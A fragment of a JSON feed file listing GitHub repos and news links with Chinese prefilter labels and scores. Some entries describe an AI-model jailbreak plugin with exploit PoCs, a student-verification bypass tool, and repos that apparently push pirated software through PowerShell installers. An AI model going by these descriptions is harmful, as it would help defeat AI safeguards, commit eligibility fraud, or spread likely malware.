+  "body": "\n\nREADME 節錄：# sheeridVerify · 教学与研究验证流程工作台 **sheeridVerify** 是一个基于 Node.js 的验证流程学习项目，提供本地 Web 工作台、任务队列、浏览器表单交互及 HTTP 状态查询，供学校教学、学术研究和获得授权的流程测试使用。 > **用途说明：** 本项目仅以教学与研究为目的提供。使用真实平台前应取得必要授权，遵守适用法律和平台条款；不得伪造身份、学籍或材料，不得冒用信息、骗取权益或绕过资格审核。本项目与 SheerID 及任何学校均无官方隶属或认可关系，也不保证验证成功。详情见 用途说明与免责声明，代码许可见 ISC 协议。 ## 文档导航 - 快速开始 - 工作台与接口说明 - Linux / Instabox 部署、更新与排错 - 浏览器流程说明 - 贡献指南 · 安全说明 · 免责声明 ## 功能 - 通过 fetch 读取验证状态，按当前步骤选择浏览器或材料处理流程。 - 在 Web 页面创建、排队、停止、恢复和删除任务；失败任务删除后可重新提交。 - 按配置限制并发，记录任务进度，提交后默认每 5 秒查询结果。 - 上传原始 PNG、JPEG、PDF 文件，不生成或修改证明材料；交互式真人验证由用户完成。 - 使用访问密码、会话 Cookie、来源检查及写请求令牌保护工作台接口。 ## 快速开始 需要 **Node.js >= 22.15** 与 npm。从 GitHub 获取源码： ```bash git clone https://github.com/JenkinWoo/sheeridVerify.git cd sheeridVerify ``` 使用下载的 ZIP 时，解压后进入其中包含 `package.json` 的目录。在项目根目录安装依赖与浏览器： ```bash npm ci npm run browser:install ``` 首次使用时复制配置，已有个人配置请直接编辑原文件。 Windows PowerShell： ```powershell Copy-Item config/sheerid.example.json config/sheerid.local.json ``` Linux / macOS： ```bash cp -n config/sheerid.example.json config/sheerid.local.json ``` 编辑 `config/sheerid.local.json`，设置获授权的国家、学校、`data.organization.emailDomain` 和材料来源。该文件必须是标准 JSON，**不支持 `//` 注释或尾随逗号**。网页会按姓名和配置后缀生成邮箱，仅应使用自己有权使用的真实地址与资料。`document.path` 与 `document.url` 只能填写其中一个；示例配置不包含可直接提交的真实资料。 ```bash npm run web ``` 打开 **http://127.0.0.1:8787**。本地默认访问密码为 `JenkinWoo`；对外开放前必须通过 `ONE_WEB_PASSWORD` 更换密码，并配置 HTTPS 入口。Linux 有界面浏览器需要可用桌面；完整部署步骤和环境变量模板见 部署指南。 ## 测试与贡献 ```bash npm test ``` 测试使用模拟接口及本地页面，不向真实验证接口提交数据。未安装 Camoufox 时会跳过浏览器相关用例；网页",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "繞過驗證之濫用工具,非正當開發主題"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "FJNB5/fujiang-pojia",
+  "url": "https://github.com/FJNB5/fujiang-pojia",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 646,
+  "language": "JavaScript",
+  "topics": [
+   "ai-agent",
+   "cve",
+   "deepseek",
+   "deepseek-harness",
+   "fujiang-pojia",
+   "knowledge-base",
+   "pojia",
+   "security-assessment",
+   "skills"
+  ],
+  "publishedAt": "2026-11-09T05:55:55Z",
+  "body": "富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面\n\nREADME 節錄：**点击加入频道：https://t.me/DeepSeek22** 欢迎加入频道，关注富江破甲。 # 富江破甲（破甲） 富江破甲（破甲）：DeepSeek Harness破甲插件，激活词富江，所有东西直接大白话问，内含技能库skill下载与调用、漏洞知识库poc利用、漏洞报告更新和全自动授权渗透。当前版本：0.20.13，附免责声明。插件图片看最下面 本项目将 `@deepseek-ai/dsh-prompt-custom` 安装到 DeepSeek Harness 的配置目录。插件程序位于 `plugin/`，提示词配置单独保存在 `prompt-custom.json`。 ## 下载与安装 在仓库页面点击 **Code → Download ZIP**（代码 → 下载压缩包），解压后安装；也可以使用 Git 克隆本仓库。 1. 先启动一次官方 DeepSeek Harness Desktop，完成 `desktop` 配置初始化。 2. 完全退出 Harness，包括右下角托盘图标中的“退出”。 3. 双击解压目录中的 **`点我执行脚本.cmd`**。 4. 安装完成后自行重新打开 Harness。 如果检测到 Harness 仍在运行，安装器会提示退出并停止，本次不会修改文件。**安装器不会自动关闭或重启 Harness，也不支持 `-NoRestart` 参数。** ```powershell # 完全退出 Harness 后执行安装 .\\点我执行脚本.cmd # 仅查看安装计划，不修改文件 .\\install.ps1 -DryRun ``` 安装器默认使用 `desktop` 配置，会从运行路径、默认安装位置、注册表和开始菜单或桌面快捷方式查找 Desktop 自带的 DSH 命令行工具，再尝试系统 PATH，支持安装到 D、E 等其他盘符。双击安装脚本仍未找到时，可按提示粘贴实际安装文件夹或可执行文件路径。 也可以手动指定安装目录；程序目录与 `.dsh` 数据目录是两个不同位置： ```powershell # 指定程序安装目录，支持中文和空格 .\\install.ps1 -DshCommand \"D:\\应用\\DeepSeek Harness\" # 仅当 .dsh 数据目录也移动过时，额外指定数据目录 .\\install.ps1 -DshCommand \"D:\\应用\\DeepSeek Harness\" -DshHome \"E:\\数据\\.dsh\" # 仅预览，不执行安装或弹出路径输入 .\\install.ps1 -DryRun -DshCommand \"D:\\应用\\DeepSeek Harness\" ``` `-DshCommand` 也接受 `DeepSeek Harness.exe` 或 `dsh.cmd` 的完整路径；`-Profile` 可指定配置名称，未传 `-DshHome` 时继续遵循已有的 `DSH_HOME` 设置。 安装时，脚本将插件复制到 `$DSH_HOME\\local-plugins\\dsh-prompt-custom`，通过 `dsh plugin --profile add ` 注册，并将附带的提示词配置复制到 `$DSH_HOME\\prompt-c",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "DSH 插件與技能庫、漏洞知識庫，與 coding agent 開發實質相關"
+  },
+  "scores": [
+   47,
+   61
+  ],
+  "score": 54,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Jensen Huang said to have had relationship with executive who reports to him",
+  "url": "https://www.nytimes.com/2026/11/11/technology/jensen-huang-nvidia-affair.html",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T22:03:58.000Z",
+  "body": "Article URL: https://www.nytimes.com/2026/11/11/technology/jensen-huang-nvidia-affair.html Comments URL: https://news.ycombinator.com/item?id=50459321 Points: 285 # Comments: 307",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "Nvidia 執行長商業八卦，與開發無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "llm 0.37.2",
+  "url": "https://simonwillison.net/2026/Nov/11/llm",
+  "source": "Simon Willison",
+  "sourceId": "simonw",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T17:19:52.000Z",
+  "body": "Release: llm 0.37.2 Fixes a security issue reported by Daniel de Araujo in GHSA-v9h7-jj4g-f862 and GHSA-r639-rr7r-x72w . LLM has a mechanism called extra-openai-models.yaml - now managed by the new-in-0.37 llm openai endpoint add command - for using LLM with OpenAI-compatible API endpoints from other providers. Daniel reported two ways this could accidentally send your configured OpenAI API key to one of those providers: if the key named by api_key_name had never been stored, or if a responses: true model was run with -o chat_completions 1 . Tags: projects , security , llm , releases",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI 命令列工具 llm 發布安全修補，屬開發工具"
+  },
+  "scores": [
+   44,
+   42
+  ],
+  "score": 43,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Kianuni/Erosion-CN",
+  "url": "https://github.com/Kianuni/Erosion-CN",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1606,
+  "language": "Swift",
+  "topics": [],
+  "publishedAt": "2026-11-10T02:37:31Z",
+  "body": "iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（简体中文防白苹果安全加固版）\n\nREADME 節錄： Erosion-CN 基于 worse_query 的 iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（简体中文防白苹果安全加固版） 支持 iOS / iPadOS 27.0 – 27.2 / 27.3 beta 1（完整支持）以及 iOS / iPadOS 26.x（部分支持）。 --- ## 项目简介与核心改进 **Erosion-CN** 分支衍生自官方上游项目 **jailbreakdotparty/Erosion**，完成了 **100% 简体中文界面本地化**，修复了原版多项严重真机 Bug，并进行了系统级防白苹果安全加固与底层能力扩展： 1. **修复重启后修改自动失效还原（反弹回原厂状态）的严重 Bug** - 原版在未手动切换过设置开关时，`mgWriteAtomically` 默认返回 `false`，导致实际走了临时文件替换（`replaceItemAt`），破坏了系统缓存文件的 Inode 与 `_mobilegestalt` POSIX 属主权限，设备一重启即被系统丢弃重建；同时原版在 iOS 27 上额外注入了非缓存键 `RegionInfo`（`zHeENZu+wbg7PUprwNwBWg`），触发开机缓存合法性校验整包重置。 - 本分支已默认强制锁定原位覆盖写入，严格遵循 iOS 27 原厂缓存键结构，并自动匹配写入对应机型的监管型号（`RegulatoryModelNumber`），**真正做到持久化生效、重启不反弹**。 2. **修复内置 Plist 编辑器破坏布尔值与相机浮点参数导致「相机黑屏」的严重 Bug** - 原版 `PlistManager` 将 `CFBoolean`（` ` / ` `）以及整数值 `Double`（如相机变焦倍率 `1.0`、`2.0`、`5.0` 等）误判转换为了 ` ` 整型，导致编辑保存 `MobileGestalt` 后系统相机取景直接黑屏。 - 本分支改用 `CFBooleanGetTypeID()` 与 `CFNumberIsFloatType()` 精确识别底层 CoreFoundation 类型，保留原始 Plist 根类型与编码格式，并对未修改项执行 **100% 原样无损直通（Lossless Pass-through）**，彻底解决相机黑屏问题。 3. **零 0 字节窗口原位写入协议（`pwrite` + 按需尾截断 + `F_FULLFSYNC`）** - 重构底层文件 I/O：不再先执行 `ftruncate(fd, 0)` 清空系统文件，而是直接从偏移 `0` 原位覆盖写入、写完后按需裁剪尾部，并调用 `fcntl(fd, F_FULLFSYNC)` 强制刷新 APFS 与物理闪存缓存，断电或异常中断绝不留空文件。 4. **写入前变更对比预览（Diff Preview）+ 写后全量读回校验与自动回滚** - 点击「应用」时逐条展示所有待修改键值与十六进制槽位对比（`修改前 → 修改后`）； - 写入前自动保存 `PreApplyGestalt.plist` 快照，写入后立即从磁盘读回并做二进制 Plist 反序列化与严格类型校验，一旦出现任何不一致立即自动原位回滚。 5. **本机 `libMobileGestalt.dylib` 运行时动态偏移解析（零硬编码）** - 在设备运行时只",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "iOS 系統設定開源工具箱，屬開發工具與開源專案"
+  },
+  "scores": [
+   35,
+   25
+  ],
+  "score": 30,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "lijiaqi-AI-Product-Manager/dsh-agent-compare",
+  "url": "https://github.com/lijiaqi-AI-Product-Manager/dsh-agent-compare",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 326,
+  "language": "TypeScript",
+  "topics": [
+   "ab-testing",
+   "code-comparison",
+   "deepseek-harness",
+   "developer-tools",
+   "dsh",
+   "dsh-plugin",
+   "frontend-tools",
+   "git-worktree",
+   "live-preview",
+   "parallel-agents",
+   "react",
+   "vite",
+   "workflow"
+  ],
+  "publishedAt": "2026-11-02T00:10:19Z",
+  "body": "同一需求，2–4 版真跑。在 DSH Desktop / Web 主对话中比较回答、文件与网页，中英双语，保留选择理由并审查采用。Compare 2–4 answers, files and live pages in DSH; keep picks, reasons and conversation context.\n\nREADME 節錄： # AgentCompare **中文** · English · 日本語 · 한국어 · Español · Português (Brasil) · Français · Deutsch **同一需求，2–4 版真跑。选风格，盲选或公开对比，再采用。** **DSH 桌面端 + 浏览器 / Desktop + Web** 安装 / Install · 真实演示 / Recorded demo > **2.0.0 · 正式版。** DSH 桌面端与 Web 端，中英双语。在主对话内比较 2–4 版回答、文件或网页；普通文件夹也能开始，复用已配置模型。 **2.0.0 新增：** - **全新蓝色液态玻璃界面。** 极光与星尘背景、玻璃面板、会滑动的玻璃选择器、液体进度球；选中时光粒迸发，揭晓时光束扫过。深色模式、减弱动效与高对比模式都已适配。 - **说出为什么选。** 选完点几个理由（布局、配色与质感、交互手感……）或补一句话；主对话接着修改时会保留这些优点。 - **快速组合。** 一键设好版本数和风格：经典对照、三种视觉、三种取舍、四向探索。 - **2–4 版，按风格比较。** 八种预设或一句话自定义；也可让不同模型使用同一风格。 - **盲选或公开对比。** 逐版体验，暂时排除后可恢复，用 1–4 专注、0 回到全部。 - **回答、文件、网页都可看。** Markdown 排版，复制回答、代码、文件内容和保存路径；明确标记你的选择。 - **留在主对话。** 比较、选择、采用与撤销写入当前对话记忆；继续交流时可接着修改。 - **Desktop + Web，中英双语。** 沿用已配置模型；有改动时先审查，再确认采用，并保留撤销与恢复入口。 1.3.0 起，普通文件夹、项目子目录、非 Vite 的 Node 项目、静态网页都能比较，回答和文件也能比较。范围与限制见更新记录。 AgentCompare 是 DeepSeek Harness（DSH）插件：同一需求，独立完成 2–4 版回答、文件或网页。有可运行页面时实际预览；没有可运行项目时按内容比较，不宣称通过功能测试。先体验再选；盲选时选后才揭晓模型和风格。采用前核对当前项目与候选改动，确认后才写回。 | 你想要 | 在哪里用 | 卡片里会看到 | |---|---|---| | 网页或界面改版 | Git 仓库里的 Vite、Node 或静态网页项目，也包括子目录 | 2–4 个能直接点击、输入的实时页面，以及共同验收 | | 脚本、文档或其它文件 | 任何目录，包括 DSH 默认工作区 | 各版写出的文件，盲选前就能逐个打开 | | 一个回答 | 任何对话 | 排好版的回答并排，可一键复制；选中的那份进入主对话记忆 | **30 秒上手：** 1. 桌面版在应用的「插件 → 添加插件」里安装 `dsh-agent-compare`（Web 版见安装）。 2. 点输入框左下角的 **A|B**，选好版本数和风格。 3. 像平常一样写需求并发送。 插件目录与安装 · Plugin directories and installation · L",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "DSH 插件，用于多版本回答/文件比較，與 coding agent 開發直接相關"
+  },
+  "scores": [
+   70,
+   72
+  ],
+  "score": 71,
+  "picked": true,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "United Airlines bans AI agents from booking flights on behalf of travelers",
+  "url": "https://www.cbsnews.com/news/united-airlines-bans-ai-agents-booking-flights",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T21:24:35.000Z",
+  "body": "Article URL: https://www.cbsnews.com/news/united-airlines-bans-ai-agents-booking-flights/ Comments URL: https://news.ycombinator.com/item?id=50458900 Points: 443 # Comments: 427",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI agent 應用與政策新聞，與 Agent 領域相關"
+  },
+  "scores": [
+   40,
+   18
+  ],
+  "score": 29,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Anthropic's IPO roadshow video",
+  "url": "https://simonwillison.net/2026/Nov/11/anthropic-ipo-roadshow",
+  "source": "Simon Willison",
+  "sourceId": "simonw",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T15:11:59.000Z",
+  "body": "Anthropic&#x27;s IPO roadshow video Anthropic kicked off their IPO roadshow yesterday, and their roadshow video has some previously unreleased information about how their business works. The section on \"Approach to compute\" with co-founder Tom Brown is particularly interesting, describing how Anthropic train and serve Claude across AWS Trainium, Google TPUs, NVIDIA GPUs, and AMD GPUs. I'm not sure why there's no official video transcript, but here's one that I extracted using MacWhisper. Highlights below: We train and serve Claude now across all four major chip families. That's only possible because early on we made an unconventional bet on a multi-chip strategy. At the time, many people thought that running AI models on different chips wasn't worth the effort. Each chip needs its own tailored software stack and inference stack, which is expensive and difficult to build. We've now been doing it for years, and we've gotten incredibly good at it. [...] As an example, this year, we started working with AMD GPUs for the first time. In the past, bringing on a new chip platform took dozens of engineers months of work This time, we had Mythos try it out. It got Claude running on AMD in just three days, with basically no human intervention . Claude ported or wrote almost 100% of the kernels. [...] The second driver of our compute advantage is our rate of discovery of compute multipliers. We focus on total effective compute, which is the multiplicative product of physical capacity tim",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "內容涉及 Claude 模型訓練、多晶片與 AI 開發能力"
+  },
+  "scores": [
+   40,
+   52
+  ],
+  "score": 46,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "mahmoudtawfik1998/secure-pdf-document-processor",
+  "url": "https://github.com/mahmoudtawfik1998/secure-pdf-document-processor",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1305,
+  "language": "HTML",
+  "topics": [
+   "acrobat-dc-pro",
+   "acrobat-for-free-2026",
+   "acrobat-no-limits",
+   "acrobat-pdf",
+   "automation",
+   "desktop",
+   "developer-tools",
+   "forms-acrobat-pro",
+   "free-pdf-reader-windows",
+   "open-source",
+   "pdf-password",
+   "pro-acrobat",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T21:23:09Z",
+  "body": "Adobe Acrobat Pro 2026: Secure Standalone PDF Document Processor for Desktop\n\nREADME 節錄： # Adobe Acrobat Pro: Secure PDF Document Processor 2026 Windows Desktop Client ### 🚀 PowerShell Quick Install --- Adobe-Acrobat-Pro is a complete standalone desktop application for secure PDF document processing, delivering a full installation setup for Windows x64 environments. Built as a ready-to-run edition, it combines enhanced security features with the robust document handling capabilities expected from a professional-grade PDF processor. The package supports offline deployment, making it suitable for controlled infrastructure where network-independent installation is required. This build targets administrators and technical users who need a reproducible, self-contained setup for secure document workflows. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Local Document Processing Pipeline:** All PDF parsing, rendering, and transformation routines execute natively on the workstation, ensuring document contents never leave the local environment during routine operations. - **Hardware-Bound License Validation:** Activation state is cryptographically tied to the host machine's hardware fingerprint, preventing unauthorized duplication while remaining transparent to the end user. - **Isolated Runtime Sandbox:** The processing engine runs within a restricted execution ",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版Adobe軟體散布，非開發相關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "OpenBMB/ForgeKernel",
+  "url": "https://github.com/OpenBMB/ForgeKernel",
+  "source": "GitHub DSH 生態",
+  "sourceId": "gh-dsh",
+  "kind": "github",
+  "stars": 315,
+  "language": "Python",
+  "topics": [],
+  "publishedAt": "2026-10-30T01:33:40Z",
+  "body": "\n\nREADME 節錄： # ForgeKernel: Self-Evolving Kernels Catching and Surpassing Experts and Agents **English** | 中文 ForgeKernel is a **self-evolving GPU kernel agent** that starts from a **reference kernel**. It reads the reference's architecture by running, timing and profiling it, turns that into an architecture-first milestone curriculum that a coding agent implements, and **promotes every accepted kernel to the next reference**, so optimization keeps going past the best known implementation. Findings certified by a hardware probe accumulate in a **knowledge base shared across operators**. In the paper, across 27 operators on Hopper and Blackwell, ForgeKernel matches or beats **18 of 22 expert-library kernels** (FlashAttention-4, cuDNN, DeepGEMM and others) and **all 7 published kernels** of three kernel-generation systems, by up to **+170.6%** (+39.4% geometric mean). The kernels are released in `kernels/`. ForgeKernel is part of the **Forge family**, together with ForgeTrain and ForgeStencil. ## News - 🛠️ **[2026-11]** Claude Code skill `forge-start` released: type `/forge-start` and it sets up and launches (or resumes) a ForgeKernel run for you. See integrations/claude-code. - 📄 **[2026-11]** ForgeKernel paper release: arXiv:2611.04998. - 📄 **[2026-10]** JustGoal paper release: arXiv:2610.36434. - 🏆 **[2026-10]** We reached **#1** on the FlashInfer-Bench leaderboard of NVIDIA SOL-ExecBench. - 🏆 **[2026-10]** We reached **#1** on Huawei CANN-Bench (Ascend A3). - 🏆 **[202",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "自我演化GPU核心agent，屬AI coding agent開發工具"
+  },
+  "scores": [
+   48,
+   35
+  ],
+  "score": 41,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Emacs in the Age of Magic",
+  "url": "https://commandlinesystems.com/magic.txt",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T20:26:32.000Z",
+  "body": "Article URL: https://commandlinesystems.com/magic.txt Comments URL: https://news.ycombinator.com/item?id=50458208 Points: 162 # Comments: 58",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Emacs 編輯器與開發工具，可能談 AI 時代編輯器"
+  },
+  "scores": [
+   14,
+   28
+  ],
+  "score": 21,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "hembramneeraj3-create/aida-64-extreme",
+  "url": "https://github.com/hembramneeraj3-create/aida-64-extreme",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1304,
+  "language": "HTML",
+  "topics": [
+   "aida64",
+   "aida64-extreme-compatibility-check",
+   "aida64-extreme-detailed-reporting",
+   "aida64-extreme-hardware-diagnostics",
+   "aida64-extreme-setup",
+   "aida64-extreme-system-information",
+   "aida64-free-setup",
+   "automation",
+   "desktop",
+   "developer-tools",
+   "open-source",
+   "pc-diagnostics-windows-platform",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app",
+   "windows-cpu-gpu-status-check",
+   "windows-performance-benchmarking"
+  ],
+  "publishedAt": "2026-11-06T20:33:44Z",
+  "body": "Aida 64 Extreme 2026: Complete Standalone Desktop Setup with Full Feature Configuration\n\nREADME 節錄： # AIDA 64 Extreme 2026: Complete Desktop Installer for Windows 11 ### 💻 PowerShell Installer --- Aida 64 Extreme 2026 is a complete standalone desktop configuration package that bundles the full feature set into a single pre-activated build, eliminating the need for separate licensing or post-install activation steps. Designed for Windows x64 desktop environments, the package delivers a ready-to-run installer that deploys all diagnostic, monitoring, and benchmarking capabilities in one pass. The build targets offline and isolated infrastructure scenarios where deterministic, repeatable deployment is required. All components are pre-configured and verified for local execution, ensuring the environment is operational immediately after setup completes. ## 📋 System Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Pre-Activated Full Build:** Complete standalone installation package with all licensing and activation layers applied at build time, requiring no post-install configuration or account binding. - **Unified Hardware Diagnostics Engine:** Integrated sensor monitoring, benchmarking, and stress-testing modules delivered in a single coherent runtime, covering CPU, GPU, memory, storage, and thermal subsystems. - **Offline-Ready Deployment:** Fully self-contained ",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版 AIDA64 破解安裝器，硬件跑分工具且屬灌星垃圾"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Show HN: I recreated Papers Please but you're deciding which YC startups to fund",
+  "url": "https://termsheetplease.com",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T19:12:16.000Z",
+  "body": "Article URL: https://termsheetplease.com/ Comments URL: https://news.ycombinator.com/item?id=50457230 Points: 196 # Comments: 77",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "網頁小遊戲專案，與前端遊戲開發相關"
+  },
+  "scores": [
+   52,
+   65
+  ],
+  "score": 58,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "abdulmannanmalik13-wq/adobe-substance-3d-studio",
+  "url": "https://github.com/abdulmannanmalik13-wq/adobe-substance-3d-studio",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1304,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "desktop",
+   "developer-tools",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "substance",
+   "substance-3d",
+   "substance-3d-painter",
+   "substance-abuse",
+   "substance-designer",
+   "substance-designer-allegorithmic",
+   "substance-painter",
+   "substance-use",
+   "substance3d",
+   "substancedesigner",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:33:06Z",
+  "body": "Adobe Substance 3D Creative Studio 2026 - Secure Asset Pipeline Desktop Installer\n\nREADME 節錄： # Adobe Substance 3D Creative Studio 2026 — Secure Asset Pipeline for Windows 11 ### ⚡ PowerShell Setup Button --- Adobe-Substance-3d is a ready-to-run desktop creative studio application that combines a full working installer with a secure digital asset deployment pipeline. The build delivers a complete 2026 desktop experience for local workstations, bundling the core creative toolset with an automated asset delivery layer that keeps material and content libraries synchronized during deployment. Engineered for offline and controlled-environment infrastructure, the installer streamlines setup while maintaining integrity across the asset pipeline. This README documents the build's configuration, deployment behavior, and operational parameters for technical evaluation and rollout. ## ✅ Before You Start - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **Pre-Activated Standalone Build:** Delivers a fully configured installation of Adobe-Substance-3d with licensing and activation already applied, eliminating post-install configuration steps and enabling immediate use in isolated or offline environments. - **Secure Digital Asset Deployment Pipeline:** Implements a verified, integrity-checked pipeline for distributing and synchronizing digital assets, ensuring that mate",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版破解安裝器+可疑腳本，灌星垃圾"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Gemini Decisions API",
+  "url": "https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T18:32:42.000Z",
+  "body": "Article URL: https://blog.google/innovation-and-ai/technology/developers-tools/gemini-decisions-api/ Comments URL: https://news.ycombinator.com/item?id=50456791 Points: 308 # Comments: 98",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Google 發布 Gemini 開發者 API，與 AI 模型開發工具有關"
+  },
+  "scores": [
+   41,
+   38
+  ],
+  "score": 39,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "AleRibeiro44/archicad-desktop-setup",
+  "url": "https://github.com/AleRibeiro44/archicad-desktop-setup",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1301,
+  "language": "HTML",
+  "topics": [
+   "archicad",
+   "archicad-2026",
+   "archicad-download",
+   "automation",
+   "desktop",
+   "developer-tools",
+   "graphisoft-archicad-install-setup-windows-2026",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:36:04Z",
+  "body": "Archicad 2026 complete standalone desktop setup with pre-configured ready-to-run installation build\n\nREADME 節錄： # Archicad 2026 Standalone Setup: Pre-Activated Desktop Build for Windows 11 ### 🚀 PowerShell Quick Install --- Archicad 2026 is distributed as a complete standalone desktop build for Windows x64, packaging the full application suite into a single pre-activated installation profile. The build preserves native BIM authoring, parametric object handling, and multi-discipline coordination workflows while eliminating external activation dependencies during deployment. Intended for offline provisioning and controlled test environments, the installer bundles all required runtime components into one self-contained package. Local configuration, project libraries, and rendering engines initialize on first launch without additional network calls. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Complete standalone installation build** — self-contained setup package that deploys the full Archicad 2026 desktop environment without requiring a separate base installation or auxiliary runtime components. - **Pre-activated configuration** — licensing state is applied during setup so the application is ready to launch immediately after installation completes, with no post-install activation workflow. - **Offline-capable deployment** — all required payloads are bun",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版預啟用軟體,疑為惡意程式,與開發無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "AWS emulator",
+  "url": "https://github.com/aws/aws-emulator",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T18:21:38.000Z",
+  "body": "https://www.aboutamazon.com/news/aws/how-autonomous-ai-agent... https://www.allthingsdistributed.com/2026/11/aws-emulator-an... Comments URL: https://news.ycombinator.com/item?id=50456631 Points: 731 # Comments: 222",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AWS 模擬器開源專案，屬開發工具"
+  },
+  "scores": [
+   43,
+   45
+  ],
+  "score": 44,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Somenicehispanic/ashampoo-winoptimizer-desktop",
+  "url": "https://github.com/Somenicehispanic/ashampoo-winoptimizer-desktop",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1301,
+  "language": "HTML",
+  "topics": [
+   "ashampoo-gmbh",
+   "ashampoo-uninstaller-install-setup-windows-2026",
+   "ashampoo-winoptimizer-system-clea",
+   "ashampoo-winoptimizer-windows",
+   "automation",
+   "clean-up",
+   "developer-tools",
+   "download-ashampoo-powerup",
+   "driver-easy-pro-pc-drivers",
+   "hardware-detection-windows",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "startup-manager-windows",
+   "unattended-uninstall",
+   "uninstall-utility",
+   "utility",
+   "windows-optimization-utility",
+   "windows-pc-driver-maintenance"
+  ],
+  "publishedAt": "2026-11-06T20:36:25Z",
